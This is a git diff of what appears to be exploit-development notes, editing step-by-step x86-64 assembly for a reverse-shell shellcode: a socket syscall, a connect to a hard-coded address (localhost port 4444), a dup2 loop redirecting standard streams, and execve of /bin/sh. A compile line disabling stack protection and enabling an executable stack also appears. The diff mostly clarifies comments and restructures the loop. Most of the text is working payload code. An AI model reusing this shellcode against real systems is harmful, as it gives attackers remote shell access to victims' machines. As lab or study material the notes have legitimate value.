@@ -30,8 +30,8 @@ gcc -m64 -z execstack -fno-stack-protector Test.c -o Test -no-pie
 
     ```
     push 0x29   ; SYS_SOCKET
-    pop rax
-    cdq         ; CLEAR RDX 
+    pop rax     
+    cdq         ; Clear RDX
     push   0x2  ; AF_INET
     pop    rdi
     push   0x1  ; SOCK_STREAM
@@ -43,32 +43,34 @@ gcc -m64 -z execstack -fno-stack-protector Test.c -o Test -no-pie
 2. Create struct_sockaddr
 
     ```
-    movabs rcx,0x100007f5c110002 ; Struct with ip, port and sin_family 
+    movabs rcx,0x100007f5c110002 ; Struct with ip, port and sin_family. All in one 
     push   rcx
     mov    rsi,rsp ; rsi now points to the struct
-    push   0x10 # Size of struct
+    push   0x10 ; Size of struct
     pop    rdx
     push 0x2a ; SYS_CONNECT
     pop rax
     syscall
     ```
 
-3. dup2 loop
+3. Dup2 loop 
 
     ```
     push   0x3 
     pop    rsi
-    dec    rsi
+    dec    rsi ; start with stderr (2)
     push   0x21 ; dup2
     pop    rax
     syscall
 
-    jne 0x7fffffffdce7  ; Make sure to duplicate everything
-    dec    rsi
-    push   0x21 ; dup2
-    pop    rax
-    syscall
-    jne    0x7fffffffdce7
+    loop:
+
+        dec    rsi
+        push   0x21 ; dup2
+        pop    rax
+        syscall
+        jne    loop
+
     ```
 
 
@@ -78,13 +80,12 @@ gcc -m64 -z execstack -fno-stack-protector Test.c -o Test -no-pie
     push   0x3b # SYS_EXECVE
     pop    rax
     cdq
-    movabs rbx,0x68732f6e69622f
+    movabs rbx,0x68732f6e69622f ; rbx has /bin/sh in hex
     push   rbx
-    mov    rdi,rsp
+    mov    rdi,rsp ; rdi points to /bin/sh
     push   rdx
     push   rdi
-    mov    rsi,rsp
+    mov    rsi,rsp ; rsi points to a pointer to /bin/sh and works as argv**
     syscall ; execve("/bin/sh", ["/bin/sh"], 0);
+
     ```
-
-
